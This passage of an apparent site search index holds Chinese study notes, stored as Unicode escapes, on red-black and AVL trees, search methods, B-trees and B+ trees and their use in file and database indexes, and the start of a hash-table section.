<p>\u6bcf\u4e2a\u7ea2\u8272\u8282\u70b9\u7684\u4e24\u4e2a\u5b50\u8282\u70b9\u90fd\u662f\u9ed1\u8272\u3002(\u4ece\u6bcf\u4e2a\u53f6\u5b50\u5230\u6839\u7684\u6240\u6709\u8def\u5f84\u4e0a\u4e0d\u80fd\u6709\u4e24\u4e2a\u8fde\u7eed\u7684\u7ea2\u8272\u8282\u70b9)</p> <p>\u4ece\u4efb\u4e00\u8282\u70b9\u5230\u5176\u6bcf\u4e2a\u53f6\u5b50\u7684\u6240\u6709\u7b80\u5355\u8def\u5f84 \u90fd\u5305\u542b\u76f8\u540c\u6570\u76ee\u7684\u9ed1\u8272\u8282\u70b9\u3002</p> <p>avl\u6811\u4e5f\u662f\u81ea\u5e73\u8861\u4e8c\u53c9\u6811\uff1b\u7ea2\u9ed1\u6811\u548cAVL\u6811\u67e5\u627e\u3001\u63d2\u5165\u3001\u5220\u9664\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u76f8\u540c\uff1b\u5305\u542bn\u4e2a\u5185\u90e8\u7ed3\u70b9\u7684\u7ea2\u9ed1\u6811\u7684\u9ad8\u5ea6\u662fo(logn); TreeMap \u662f\u4e00\u4e2a\u7ea2\u9ed1\u6811\u7684\u5b9e\u73b0\uff0c\u80fd\u4fdd\u8bc1\u63d2\u5165\u7684\u503c\u4fdd\u8bc1\u6392\u5e8f</p> <p>STL\u548clinux\u591a\u4f7f\u7528\u7ea2\u9ed1\u6811\u4f5c\u4e3a\u5e73\u8861\u6811\u7684\u5b9e\u73b0\uff1a </p> <p>\u5982\u679c\u63d2\u5165\u4e00\u4e2anode\u5f15\u8d77\u4e86\u6811\u7684\u4e0d\u5e73\u8861\uff0cAVL\u548cRB-Tree\u90fd\u662f\u6700\u591a\u53ea\u9700\u89812\u6b21\u65cb\u8f6c\u64cd\u4f5c\uff0c\u5373\u4e24\u8005\u90fd\u662fO(1)\uff1b\u4f46\u662f\u5728\u5220\u9664node\u5f15\u8d77\u6811\u7684\u4e0d\u5e73\u8861\u65f6\uff0c\u6700\u574f\u60c5\u51b5\u4e0b\uff0cAVL\u9700\u8981\u7ef4\u62a4\u4ece\u88ab\u5220node\u5230root\u8fd9\u6761\u8def\u5f84\u4e0a\u6240\u6709node\u7684\u5e73\u8861\u6027\uff0c\u56e0\u6b64\u9700\u8981\u65cb\u8f6c\u7684\u91cf\u7ea7O(logN)\uff0c\u800cRB-Tree\u6700\u591a\u53ea\u97003\u6b21\u65cb\u8f6c\uff0c\u53ea\u9700\u8981O(1)\u7684\u590d\u6742\u5ea6\u3002</p> <p>\u5176\u6b21\uff0cAVL\u7684\u7ed3\u6784\u76f8\u8f83RB-Tree\u6765\u8bf4\u66f4\u4e3a\u5e73\u8861\uff0c\u5728\u63d2\u5165\u548c\u5220\u9664node\u66f4\u5bb9\u6613\u5f15\u8d77Tree\u7684unbalance\uff0c\u56e0\u6b64\u5728\u5927\u91cf\u6570\u636e\u9700\u8981\u63d2\u5165\u6216\u8005\u5220\u9664\u65f6\uff0cAVL\u9700\u8981rebalance\u7684\u9891\u7387\u4f1a\u66f4\u9ad8\u3002\u56e0\u6b64\uff0cRB-Tree\u5728\u9700\u8981\u5927\u91cf\u63d2\u5165\u548c\u5220\u9664node\u7684\u573a\u666f\u4e0b\uff0c\u6548\u7387\u66f4\u9ad8\u3002\u81ea\u7136\uff0c\u7531\u4e8eAVL\u9ad8\u5ea6\u5e73\u8861\uff0c\u56e0\u6b64AVL\u7684search\u6548\u7387\u66f4\u9ad8\u3002</p> <p>map\u7684\u5b9e\u73b0\u53ea\u662f\u6298\u8877\u4e86\u4e24\u8005\u5728search\u3001insert\u4ee5\u53cadelete\u4e0b\u7684\u6548\u7387\u3002\u603b\u4f53\u6765\u8bf4\uff0cRB-tree\u7684\u7edf\u8ba1\u6027\u80fd\u662f\u9ad8\u4e8eAVL\u7684\u3002</p> <p>\u67e5\u627e\u603b\u7ed3</p> <p>\u65e2\u5e0c\u671b\u8f83\u5feb\u7684\u67e5\u627e\u53c8\u4fbf\u4e8e\u7ebf\u6027\u8868\u52a8\u6001\u53d8\u5316\u7684\u67e5\u627e\u65b9\u6cd5\u662f\u54c8\u5e0c\u6cd5\u67e5\u627e\u3002\u4e8c\u53c9\u6392\u5e8f\u6811\u67e5\u627e\uff0c\u6700\u4f18\u4e8c\u53c9\u6811\u67e5\u627e\uff0c\u952e\u6811\u67e5\u627e\uff0c\u54c8\u5e0c\u6cd5\u67e5\u627e\u662f\u52a8\u6001\u67e5\u627e\u3002\u5206\u5757\u3001\u987a\u5e8f\u3001\u6298\u534a\u3001\u7d22\u5f15\u987a\u5e8f\u67e5\u627e\u5747\u4e3a\u9759\u6001\u3002\u5206\u5757\u6cd5\u5e94\u8be5\u662f\u5c06\u6574\u4e2a\u7ebf\u6027\u8868\u5206\u6210\u82e5\u5e72\u5757\u8fdb\u884c\u4fdd\u5b58\uff0c\u82e5\u52a8\u6001\u53d8\u5316\u5219\u53ef\u4ee5\u6dfb\u52a0\u5728\u8868\u7684\u5c3e\u90e8\uff08\u975e\u987a\u5e8f\u7ed3\u6784\uff09\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u662fO(1)\uff0c\u67e5\u627e\u590d\u6742\u5ea6\u4e3aO(n)\uff1b\u82e5\u6bcf\u4e2a\u8868\u5185\u90e8\u4e3a\u987a\u5e8f\u7ed3\u6784\uff0c\u5219\u53ef\u7528\u4e8c\u5206\u6cd5\u5c06\u67e5\u627e\u65f6\u95f4\u590d\u6742\u5ea6\u964d\u81f3O(logn)\uff0c\u4f46\u540c\u65f6\u52a8\u6001\u53d8\u5316\u590d\u6742\u5ea6\u5219\u53d8\u6210O(n)\uff1b\u987a\u5e8f\u6cd5\u662f\u6328\u4e2a\u67e5\u627e\uff0c\u8fd9\u79cd\u65b9\u6cd5\u6700\u5bb9\u6613\u5b9e\u73b0\uff0c\u4e0d\u8fc7\u67e5\u627e\u65f6\u95f4\u590d\u6742\u5ea6\u90fd\u662fO(n)\uff0c\u52a8\u6001\u53d8\u5316\u65f6\u53ef\u5c06\u4fdd\u5b58\u503c\u653e\u5165\u7ebf\u6027\u8868\u5c3e\u90e8\uff0c\u5219\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(1)\uff1b\u4e8c\u5206\u6cd5\u662f\u57fa\u4e8e\u987a\u5e8f\u8868\u7684\u4e00\u79cd\u67e5\u627e\u65b9\u5f0f\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(logn)\uff1b\u901a\u8fc7\u54c8\u5e0c\u51fd\u6570\u5c06\u503c\u8f6c\u5316\u6210\u5b58\u653e\u8be5\u503c\u7684\u76ee\u6807\u5730\u5740\uff0cO\uff081\uff09</p> <p>\u4e8c\u53c9\u6811\u7684\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e3aO(log2n)\u2014\u2014O(n).\u4e8c\u53c9\u6392\u5e8f\u6811\u7684\u67e5\u627e\u6548\u7387\u4e0e\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u6709\u5173\uff0c\u9ad8\u5ea6\u8d8a\u4f4e\uff0c\u67e5\u627e\u6548\u7387\u8d8a\u9ad8\u3002\u4e8c\u53c9\u6811\u7684\u67e5\u627e\u6210\u529f\u7684\u5e73\u5747\u67e5\u627e\u957f\u5ea6ASL\u4e0d\u8d85\u8fc7\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u3002\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u4e0e\u4e8c\u53c9\u6811\u7684\u5f62\u6001\u6709\u5173\uff0cn\u4e2a\u8282\u70b9\u7684\u5b8c\u5168\u4e8c\u53c9\u6811\u9ad8\u5ea6\u6700\u5c0f\uff0c\u9ad8\u5ea6\u4e3a<code>[log2n]+1</code>,n\u4e2a\u8282\u70b9\u7684\u5355\u53ea\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u6700\u5927\uff0c\u9ad8\u5ea6\u4e3an\uff0c\u6b64\u65f6\u67e5\u627e\u6210\u529f\u7684ASL\u4e3a\u6700\u5927(n+1)/2\uff0c\u56e0\u6b64\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u8303\u56f4\u4e3a<code>[log2n]+1\u2014\u2014n</code></p> <p>\u94fe\u5f0f\u5b58\u50a8\u4e0d\u80fd\u968f\u673a\u8bbf\u95ee\uff0c\u5fc5\u987b\u662f\u987a\u5e8f\u5b58\u50a8</p> <p>B_\u6811\u7684B+\u6811</p>"},{"location":"other/data%20structure%20basic/#b_","title":"B_\u6811","text":"<p>B-\u6811\u5c31\u662fB\u6811\u3002m\u9636B_\u6811\u6ee1\u8db3\u6216\u7a7a\uff0c\u6216\u4e3a\u6ee1\u8db3\u4e0b\u5217\u6027\u8d28\u7684m\u53c9\u6811\uff1a</p> <p>\u6811\u4e2d\u6bcf\u4e2a\u7ed3\u70b9\u6700\u591a\u6709m\u68f5\u5b50\u6811</p> <p>\u6839\u7ed3\u70b9\u5728\u4e0d\u662f\u53f6\u5b50\u65f6\uff0c\u81f3\u5c11\u6709\u4e24\u68f5\u5b50\u6811</p> <p>\u9664\u6839\u5916\uff0c\u6240\u6709\u975e\u7ec8\u7aef\u7ed3\u70b9\u81f3\u5c11\u6709\u23a1m/2\u23a4\u68f5\u5b50\u6811 </p> <p>\u6709s\u4e2a\u5b50\u6811\u7684\u975e\u53f6\u7ed3\u70b9\u5177\u6709 n = s-1\u4e2a\u5173\u952e\u5b57\uff0c\u7ed3\u70b9\u7684\u4fe1\u606f\u7ec4\u7ec7\u4e3a:(n,A0,K1,A1,K2,A2 \u2026 Kn\uff0cAn)\u3002\u8fd9\u91cc\uff1an\u4e3a\u5173\u952e\u5b57\u7684\u4e2a\u6570\uff0cki\uff08i=1,2,\u2026,n)\u4e3a\u5173\u952e\u5b57\uff0c\u4e14\u6ee1\u8db3Ki\u5c0f\u4e8eKi+1,\uff0cAi(i=0,1,..n)\u4e3a\u6307\u5411\u5b50\u6811\u7684\u6307\u9488\u3002</p> <p>\u6240\u6709\u7684\u53f6\u5b50\u7ed3\u70b9\u90fd\u51fa\u73b0\u5728\u540c\u4e00\u5c42\u4e0a\uff0c\u4e0d\u5e26\u4fe1\u606f\uff08\u53ef\u8ba4\u4e3a\u5916\u90e8\u7ed3\u70b9\u6216\u5931\u8d25\u7ed3\u70b9\uff09\u3002</p> <p>\u5173\u952e\u5b57\u96c6\u5408\u5206\u5e03\u5728\u6574\u9897\u6811\u4e2d</p> <p>\u4efb\u4f55\u4e00\u4e2a\u5173\u952e\u5b57\u51fa\u73b0\u4e14\u53ea\u51fa\u73b0\u5728\u4e00\u4e2a\u7ed3\u70b9\u4e2d</p> <p>\u641c\u7d22\u6709\u53ef\u80fd\u5728\u975e\u53f6\u5b50\u7ed3\u70b9\u7ed3\u675f</p> <p>\u5176\u641c\u7d22\u6027\u80fd\u7b49\u4ef7\u4e8e\u5728\u5173\u952e\u5b57\u5168\u96c6\u5185\u505a\u4e00\u6b21\u4e8c\u5206\u67e5\u627e</p> <p>\u53ea\u9002\u7528\u4e8e\u968f\u673a\u68c0\u7d22\uff0c\u4e0d\u9002\u7528\u4e8e\u987a\u5e8f\u68c0\u7d22\u3002</p> <p>\u6709\u7ed3\u70b9\u7684\u5e73\u8861\u56e0\u5b50\u90fd\u4e3a\u96f6</p> <p>M\u9636B-\u6811\u4e2d\u542b\u6709N\u4e2a\u5173\u952e\u5b57\uff0c\u6700\u5927\u6df1\u5ea6\u4e3alog\u23a1m/2\u23a4(n+1)/2+2</p> <p>B_\u6811\u4e2d\u7ed3\u70b9\u7684\u63d2\u5165</p> <p>m\u4ee3\u8868B_\u6811\u7684\u9636\uff0c\u63d2\u5165\u603b\u53d1\u751f\u5728\u6700\u4f4e\u5c42</p> <p>\u63d2\u5165\u540e\u5173\u952e\u5b57\u4e2a\u6570\u5c0f\u4e8e\u7b49\u4e8e m-1,\u5b8c\u6210\u3002</p> <p>\u63d2\u5165\u540e\u5173\u952e\u5b57\u4e2a\u6570\u7b49\u4e8em,\u7ed3\u70b9\u5206\u88c2\uff0c\u4ee5\u4e2d\u70b9\u6570\u636e\u4e3a\u754c\u4e00\u5206\u4e3a\u4e8c\uff0c\u4e2d\u70b9\u6570\u636e\u653e\u5230\u53cc\u4eb2\u7ed3\u70b9\u4e2d\u3002\u8fd9\u6837\u5c31\u6709\u53ef\u80fd\u4f7f\u5f97\u53cc\u4eb2\u7ed3\u70b9\u7684\u6570\u636e\u4e2a\u6570\u4e3am,\u5f15\u8d77\u53cc\u4eb2\u7ed3\u70b9\u7684\u5206\u88c2\uff0c\u6700\u574f\u60c5\u51b5\u4e0b\u4e00\u76f4\u6ce2\u53ca\u5230\u6839\uff0c\u5f15\u8d77\u6839\u7684\u5206\u88c2\u2014\u2014B_\u6811\u957f\u9ad8\u3002</p> <p>3\u9636B_\u6811\u7684\u63d2\u5165\u3002\u6bcf\u4e2a\u7ed3\u70b9\u6700\u591a3\u68f5\u5b50\u6811\uff0c2\u4e2a\u6570\u636e\uff1b\u6700\u5c112\u68f5\u5b50\u6811\uff0c1\u4e2a\u6570\u636e\u3002\u6240\u4ee53\u9636B_\u6811\u4e5f\u79f0\u4e3a2-3\u6811\u3002</p> <p>B_\u6811\u4e2d\u7ed3\u70b9\u7684\u5220\u9664</p> <p>\u5220\u9664\u53d1\u751f\u5728\u6700\u5e95\u5c42 </p> <p>\u88ab\u5220\u5173\u952e\u5b57\u6240\u5728\u7ed3\u70b9\u4e2d\u7684\u5173\u952e\u5b57\u6570\u76ee\u5927\u4e8e\u7b49\u4e8e m/2 \uff0c\u76f4\u63a5\u5220\u9664\u3002</p> <p>\u5220\u9664\u540e\u7ed3\u70b9\u4e2d\u6570\u636e\u4e3a\u23a1m/2\u23a4-2\uff0c\u800c\u76f8\u90bb\u7684\u5de6\uff08\u53f3\uff09\u5144\u5f1f\u4e2d\u6570\u636e\u5927\u4e8e\u23a1m/2\u23a4-1\uff0c\u6b64\u65f6\u5de6\uff08\u53f3\u5144\u5f1f\uff09\u4e2d\u6700\u5927\uff08\u5c0f\uff09\u7684\u6570\u636e\u4e0a\u79fb\u5230\u53cc\u4eb2\u4e2d\uff0c\u53cc\u4eb2\u4e2d\u63a5\uff08\u9760\uff09\u5728\u5b83\u540e\uff08\u524d\uff09\u9762\u7684\u6570\u636e\u79fb\u5230\u88ab\u5220\u6570\u636e\u7684\u7ed3\u70b9\u4e2d</p> <p>\u5176\u5de6\u53f3\u5144\u5f1f\u7ed3\u70b9\u4e2d\u6570\u636e\u90fd\u662f\u23a1m/2\u23a4-1\uff0c\u6b64\u65f6\u548c\u5de6\uff08\u53f3\uff09\u5144\u5f1f\u5408\u5e76\uff0c\u5408\u5e76\u65f6\u8fde\u540c\u53cc\u4eb2\u4e2d\u76f8\u5173\u7684\u5173\u952e\u5b57\u3002\u6b64\u65f6\uff0c\u53cc\u4eb2\u4e2d\u5c11\u4e86\u4e00\u9879\uff0c\u56e0\u6b64\u53c8\u53ef\u80fd\u5f15\u8d77\u53cc\u4eb2\u7684\u5408\u5e76\uff0c\u6700\u574f\u4e00\u76f4\u5230\u6839\uff0c\u4f7fB-\u6811\u964d\u4f4e\u4e00\u5c42\u3002</p> <p>\u5220\u9664\u4e0d\u5728\u6700\u5e95\u5c42 </p> <p>\u5728\u5927\u4e8e\u88ab\u5220\u6570\u636e\u4e2d\u9009\u6700\u5c0f\u7684\u4ee3\u66ff\u88ab\u5220\u6570\u636e\uff0c\u95ee\u9898\u8f6c\u6362\u6210\u5728\u6700\u5e95\u5c42\u7684\u5220\u9664</p>"},{"location":"other/data%20structure%20basic/#b","title":"B+\u6811","text":"<p>\u5728\u5b9e\u9645\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u7528\u7684\u662fB+\u6811\u6216\u5176\u53d8\u5f62\u3002\u6709\u5173\u6027\u8d28\u4e0e\u64cd\u4f5c\u7c7b\u4f3c\u4e0eB_\u6811\u3002</p> <p>\u5dee\u5f02\uff1a</p> <p>\u6709n\u68f5\u5b50\u6811\u7684\u7ed3\u70b9\u4e2d\u6709n\u4e2a\u5173\u952e\u5b57\uff0c\u6bcf\u4e2a\u5173\u952e\u5b57\u4e0d\u4fdd\u5b58\u6570\u636e\uff0c\u53ea\u7528\u6765\u7d22\u5f15\uff0c\u6240\u6709\u6570\u636e\u90fd\u4fdd\u5b58\u5728\u53f6\u5b50\u8282\u70b9\u3002</p> <p>\u6240\u6709\u53f6\u5b50\u7ed3\u70b9\u4e2d\u5305\u542b\u5168\u90e8\u5173\u952e\u5b57\u4fe1\u606f\uff0c\u53ca\u5bf9\u5e94\u8bb0\u5f55\u4f4d\u7f6e\u4fe1\u606f\u53ca\u6307\u5411\u542b\u6709\u8fd9\u4e9b\u5173\u952e\u5b57\u8bb0\u5f55\u7684\u6307\u9488\uff0c\u4e14\u53f6\u5b50\u7ed3\u70b9\u672c\u8eab\u4f9d\u5173\u952e\u5b57\u7684\u5927\u5c0f\u81ea\u5c0f\u800c\u5927\u7684\u987a\u5e8f\u94fe\u63a5\u3002(\u800cB\u6811\u7684\u53f6\u5b50\u8282\u70b9\u5e76\u6ca1\u6709\u5305\u62ec\u5168\u90e8\u9700\u8981\u67e5\u627e\u7684\u4fe1\u606f)</p> <p>\u6240\u6709\u975e\u53f6\u5b50\u4e3a\u7d22\u5f15\uff0c\u7ed3\u70b9\u4e2d\u4ec5\u542b\u6709\u5176\u5b50\u6811\u6839\u7ed3\u70b9\u4e2d\u6700\u5927\uff08\u6216\u6700\u5c0f\uff09\u5173\u952e\u5b57\u3002 (\u800cB\u6811\u7684\u975e\u7ec8\u8282\u70b9\u4e5f\u5305\u542b\u9700\u8981\u67e5\u627e\u7684\u6709\u6548\u4fe1\u606f)</p> <p>\u975e\u53f6\u6700\u5e95\u5c42\u987a\u5e8f\u8054\u7ed3\uff0c\u8fd9\u6837\u53ef\u4ee5\u8fdb\u884c\u987a\u5e8f\u67e5\u627e</p> <p>B+\u7279\u6027</p> <p>\u6240\u6709\u5173\u952e\u5b57\u90fd\u51fa\u73b0\u5728\u53f6\u5b50\u7ed3\u70b9\u7684\u94fe\u8868\u4e2d\uff08\u7a20\u5bc6\u7d22\u5f15\uff09\uff0c\u4e14\u94fe\u8868\u4e2d\u7684\u5173\u952e\u5b57\u6070\u597d\u662f\u6709\u5e8f\u7684\uff1b</p> <p>\u4e0d\u53ef\u80fd\u5728\u975e\u53f6\u5b50\u7ed3\u70b9\u547d\u4e2d</p> <p>\u975e\u53f6\u5b50\u7ed3\u70b9\u76f8\u5f53\u4e8e\u662f\u53f6\u5b50\u7ed3\u70b9\u7684\u7d22\u5f15\uff08\u7a00\u758f\u7d22\u5f15\uff09\uff0c\u53f6\u5b50\u7ed3\u70b9\u76f8\u5f53\u4e8e\u662f\u5b58\u50a8\uff08\u5173\u952e\u5b57\uff09\u6570\u636e\u7684\u6570\u636e\u5c42</p> <p>\u66f4\u9002\u5408\u6587\u4ef6\u7d22\u5f15\u7cfb\u7edf</p> <p>B+\u6811\u63d2\u5165\u64cd\u4f5c\u7684\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(logn)\uff0c\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(logn)</p> <p>\u67e5\u627e\u8fc7\u7a0b</p> <p>\u5728 B+ \u6811\u4e0a\uff0c\u65e2\u53ef\u4ee5\u8fdb\u884c\u7f29\u5c0f\u8303\u56f4\u7684\u67e5\u627e\uff0c\u4e5f\u53ef\u4ee5\u8fdb\u884c\u987a\u5e8f\u67e5\u627e\uff1b</p> <p>\u5728\u8fdb\u884c\u7f29\u5c0f\u8303\u56f4\u7684\u67e5\u627e\u65f6\uff0c\u4e0d\u7ba1\u6210\u529f\u4e0e\u5426\uff0c\u90fd\u5fc5\u987b\u67e5\u5230\u53f6\u5b50\u7ed3\u70b9\u624d\u80fd\u7ed3\u675f\uff1b</p> <p>\u82e5\u5728\u7ed3\u70b9\u5185\u67e5\u627e\u65f6\uff0c\u7ed9\u5b9a\u503c\u2264Ki\uff0c \u5219\u5e94\u7ee7\u7eed\u5728 Ai \u6240\u6307\u5b50\u6811\u4e2d\u8fdb\u884c\u67e5\u627e</p> <p>\u63d2\u5165\u548c\u5220\u9664\u7684\u64cd\u4f5c\uff1a\u7c7b\u4f3c\u4e8eB_\u6811\u8fdb\u884c\uff0c\u5373\u5fc5\u8981\u65f6\uff0c\u4e5f\u9700\u8981\u8fdb\u884c\u7ed3\u70b9\u7684\u201c\u5206\u88c2\u201d\u6216\u201c\u5408\u5e76\u201d\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8bf4B+tree\u6bd4B\u6811\u66f4\u9002\u5408\u5b9e\u9645\u5e94\u7528\u4e2d\u64cd\u4f5c\u7cfb\u7edf\u7684\u6587\u4ef6\u7d22\u5f15\u548c\u6570\u636e\u5e93\u7d22\u5f15\uff1f</p> <p>B+tree\u7684\u78c1\u76d8\u8bfb\u5199\u4ee3\u4ef7\u66f4\u4f4e </p> <p>B+tree\u7684\u5185\u90e8\u7ed3\u70b9\u5e76\u6ca1\u6709\u6307\u5411\u5173\u952e\u5b57\u5177\u4f53\u4fe1\u606f\u7684\u6307\u9488\u3002\u56e0\u6b64\u5176\u5185\u90e8\u7ed3\u70b9\u76f8\u5bf9B \u6811\u66f4\u5c0f\u3002\u5982\u679c\u628a\u6240\u6709\u540c\u4e00\u5185\u90e8\u7ed3\u70b9\u7684\u5173\u952e\u5b57\u5b58\u653e\u5728\u540c\u4e00\u76d8\u5757\u4e2d\uff0c\u90a3\u4e48\u76d8\u5757\u6240\u80fd\u5bb9\u7eb3\u7684\u5173\u952e\u5b57\u6570\u91cf\u4e5f\u8d8a\u591a\u3002\u4e00\u6b21\u6027\u8bfb\u5165\u5185\u5b58\u4e2d\u7684\u9700\u8981\u67e5\u627e\u7684\u5173\u952e\u5b57\u4e5f\u5c31\u8d8a\u591a\u3002\u76f8\u5bf9\u6765\u8bf4IO\u8bfb\u5199\u6b21\u6570\u4e5f\u5c31\u964d\u4f4e\u4e86\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u78c1\u76d8\u4e2d\u7684\u4e00\u4e2a\u76d8\u5757\u5bb9\u7eb316bytes\uff0c\u800c\u4e00\u4e2a\u5173\u952e\u5b572bytes\uff0c\u4e00\u4e2a\u5173\u952e\u5b57\u5177\u4f53\u4fe1\u606f\u6307\u94882bytes\u3002\u4e00\u68f59\u9636B-tree(\u4e00\u4e2a\u7ed3\u70b9\u6700\u591a8\u4e2a\u5173\u952e\u5b57)\u7684\u5185\u90e8\u7ed3\u70b9\u9700\u89812\u4e2a\u76d8\u5feb\u3002\u800cB+\u6811\u5185\u90e8\u7ed3\u70b9\u53ea\u9700\u89811\u4e2a\u76d8\u5feb\u3002\u5f53\u9700\u8981\u628a\u5185\u90e8\u7ed3\u70b9\u8bfb\u5165\u5185\u5b58\u4e2d\u7684\u65f6\u5019\uff0cB\u6811\u5c31\u6bd4B+\u6811\u591a\u4e00\u6b21\u76d8\u5757\u67e5\u627e\u65f6\u95f4(\u5728\u78c1\u76d8\u4e2d\u5c31\u662f\u76d8\u7247\u65cb\u8f6c\u7684\u65f6\u95f4)\u3002</p> <p>B+tree\u7684\u67e5\u8be2\u6548\u7387\u66f4\u52a0\u7a33\u5b9a </p> <p>\u7531\u4e8e\u975e\u7ec8\u7ed3\u70b9\u5e76\u4e0d\u662f\u6700\u7ec8\u6307\u5411\u6587\u4ef6\u5185\u5bb9\u7684\u7ed3\u70b9\uff0c\u800c\u53ea\u662f\u53f6\u5b50\u7ed3\u70b9\u4e2d\u5173\u952e\u5b57\u7684\u7d22\u5f15\u3002\u6240\u4ee5\u4efb\u4f55\u5173\u952e\u5b57\u7684\u67e5\u627e\u5fc5\u987b\u8d70\u4e00\u6761\u4ece\u6839\u7ed3\u70b9\u5230\u53f6\u5b50\u7ed3\u70b9\u7684\u8def\u3002\u6240\u6709\u5173\u952e\u5b57\u67e5\u8be2\u7684\u8def\u5f84\u957f\u5ea6\u76f8\u540c\uff0c\u5bfc\u81f4\u6bcf\u4e00\u4e2a\u6570\u636e\u7684\u67e5\u8be2\u6548\u7387\u76f8\u5f53\u3002</p> <p>B\u6811\u548cB+\u6811\u90fd\u662f\u5e73\u8861\u7684\u591a\u53c9\u6811\u3002B\u6811\u548cB+\u6811\u90fd\u53ef\u7528\u4e8e\u6587\u4ef6\u7684\u7d22\u5f15\u7ed3\u6784\u3002B\u6811\u548cB+\u6811\u90fd\u80fd\u6709\u6548\u7684\u652f\u6301\u968f\u673a\u68c0\u7d22\u3002B+\u6811\u65e2\u80fd\u7d22\u5f15\u67e5\u627e\u4e5f\u80fd\u987a\u5e8f\u67e5\u627e.</p>"},{"location":"other/data%20structure%20basic/#_6","title":"\u54c8\u5e0c\u8868","text":"<p>\u5728\u8bb0\u5f55\u7684\u5b58\u50a8\u5730\u5740\u548c\u5b83\u7684\u5173\u952e\u5b57\u4e4b\u95f4\u5efa\u7acb\u4e00\u4e2a\u786e\u5b9a\u7684\u5bf9\u5e94\u5173\u7cfb\uff1b\u8fd9\u6837\u4e0d\u7ecf\u8fc7\u6bd4\u8f83\uff0c\u4e00\u6b21\u5b58\u53d6\u5c31\u80fd\u5f97\u5230\u5143\u7d20\u3002 </p> <p>\u54c8\u5e0c\u51fd\u6570\u2014\u2014\u5728\u8bb0\u5f55\u7684\u5173\u952e\u5b57\u4e0e\u8bb0\u5f55\u7684\u5b58\u50a8\u4f4d\u7f6e\u4e4b\u95f4\u5efa\u7acb\u7684\u4e00\u79cd\u5bf9\u5e94\u5173\u7cfb\u3002\u662f\u4ece\u5173\u952e\u5b57\u7a7a\u95f4\u5230\u5b58\u50a8\u4f4d\u7f6e\u7a7a\u95f4\u7684\u4e00\u79cd\u6620\u8c61\u3002</p> <p>\u54c8\u5e0c\u8868\u2014\u2014\u5e94\u7528\u54c8\u5e0c\u51fd\u6570\uff0c\u7531\u8bb0\u5f55\u7684\u5173\u952e\u5b57\u786e\u5b9a\u8bb0\u5f55\u5728\u8868\u4e2d\u7684\u4f4d\u7f6e\u4fe1\u606f\uff0c\u5e76\u5c06\u8bb0\u5f55\u6839\u636e\u6b64\u4fe1\u606f\u653e\u5165\u8868\u4e2d\uff0c\u8fd9\u6837\u6784\u6210\u7684\u8868\u53eb\u54c8\u5e0c\u8868\u3002</p> <p>Hash\u67e5\u627e\u9002\u5408\u4e8e\u5173\u952e\u5b57\u53ef\u80fd\u51fa\u73b0\u7684\u503c\u7684\u96c6\u5408\u8fdc\u8fdc\u5927\u4e8e\u5b9e\u9645\u5173\u952e\u5b57\u96c6\u5408\u7684\u60c5\u5f62\u3002</p> <p>\u66f4\u9002\u5408\u67e5\u627e\uff0c\u4e0d\u9002\u5408\u9891\u7e41\u66f4\u65b0</p> <p>Hash\u8868\u7b49\u67e5\u627e\u590d\u6742\u4f9d\u8d56\u4e8eHash\u503c\u7b97\u6cd5\u7684\u6709\u6548\u6027\uff0c\u5728\u6700\u597d\u7684\u60c5\u51b5\u4e0b\uff0chash\u8868\u67e5\u627e\u590d\u6742\u5ea6\u4e3aO(1)\u3002\u53ea\u6709\u65e0\u51b2\u7a81\u7684hash_table\u590d\u6742\u5ea6\u624d\u662fO(1)\u3002\u4e00\u822c\u662fO\u00a9\uff0cc\u4e3a\u54c8\u5e0c\u5173\u952e\u5b57\u51b2\u7a81\u65f6\u67e5\u627e\u7684\u5e73\u5747\u957f\u5ea6\u3002\u63d2\u5165\uff0c\u5220\u9664\uff0c\u67e5\u627e\u90fd\u662fO(1)\u3002\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e0d\u968f\u8868\u4e2d\u7ed3\u70b9\u6570\u76ee\u7684\u589e\u52a0\u800c\u589e\u52a0,\u800c\u662f\u968f\u8d1f\u8f7d\u56e0\u5b50\u7684\u589e\u5927\u800c\u589e\u5927</p> <p>\u7531\u4e8e\u51b2\u7a81\u7684\u4ea7\u751f\uff0c\u4f7f\u5f97\u54c8\u5e0c\u8868\u7684\u67e5\u627e\u8fc7\u7a0b\u4ecd\u7136\u662f\u4e00\u4e2a\u7ed9\u5b9a\u503c\u4e0e\u5173\u952e\u5b57\u6bd4\u8f83\u7684\u8fc7\u7a0b\u3002</p> <p>\u6839\u636e\u62bd\u5c49\u539f\u7406\uff0c\u51b2\u7a81\u662f\u4e0d\u53ef\u80fd\u5b8c\u5168\u907f\u514d\u7684\uff0c\u6240\u4ee5\uff0c\u9009\u62e9\u597d\u7684\u6563\u5217\u51fd\u6570\u548c\u51b2\u7a81\u5904\u7406\u65b9\u6cd5\uff1a</p> <p>\u6784\u9020\u4e00\u4e2a\u6027\u80fd\u597d\uff0c\u51b2\u7a81\u5c11\u7684Hash\u51fd\u6570</p> <p>\u5982\u4f55\u89e3\u51b3\u51b2\u7a81</p> <p>\u5e38\u7528\u7684\u54c8\u5e0c\u51fd\u6570</p> <p>\u76f4\u63a5\u5b9a\u5740\u6cd5\u3002\u4ec5\u9002\u5408\u4e8e\uff1a\u5730\u5740\u96c6\u5408\u7684\u5927\u5c0f == \u5173\u952e\u5b57\u96c6\u5408\u7684\u5927\u5c0f</p> 